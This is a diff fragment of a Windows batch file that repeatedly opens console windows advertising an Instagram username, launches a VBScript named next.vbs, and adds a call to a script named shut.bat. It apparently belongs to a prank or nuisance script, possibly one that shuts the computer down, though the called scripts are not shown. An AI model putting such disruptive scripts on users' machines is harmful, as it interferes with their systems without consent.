@@ -39,4 +39,5 @@ start echo FOLLLOW ME ON INSTAGRAM USER NAME jumli_d
 start echo FOLLLOW ME ON INSTAGRAM USER NAME jumli_d
 start echo FOLLLOW ME ON INSTAGRAM USER NAME jumli_d
 start "" "C:\Users\R R S COMPUTER\next.vbs"
+call "C:\Users\R R S COMPUTER\shut.bat"
 pause
